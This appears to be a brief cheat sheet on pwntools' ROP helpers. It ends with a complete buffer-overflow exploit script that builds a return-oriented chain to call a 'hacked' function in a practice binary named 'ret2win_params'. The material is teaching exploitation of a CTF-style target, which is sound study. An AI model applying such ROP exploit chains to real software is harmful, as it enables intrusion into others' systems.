# Return Oriented Programming (ROP)

```
elf = context.binary = ELF("./file", checksec=False)
rop = ROP(elf)
rop.gadgets
rop.rdi #rdi rop object
rop.rsi #rsi rop object
rop.rsi[0] #address
```

## Adding Raw Data and Dumpint ROP Stack
```
rop.raw(0xdeadbeef)
rop.raw(0xcafebabe)
rop.raw(0x12345678)
rop.raw('AAAAAAAA')
print(rop.dump())
```

## Sending line
```
p.sendline(rop.chain())
```

Example
```
from pwn import *

elf = context.binary = ELF("./ret2win_params", checksec=False)
p = process(["./ret2win_params"])
rop = ROP(elf)

offset = 16;
payload = b"A" * offset
payload += b"B" * 8
rop.raw(payload)
rop.hacked(0xdeadbeefdeadbeef,0xc0debabec0debabe)
p.sendline(rop.chain())
p.interactive()
```
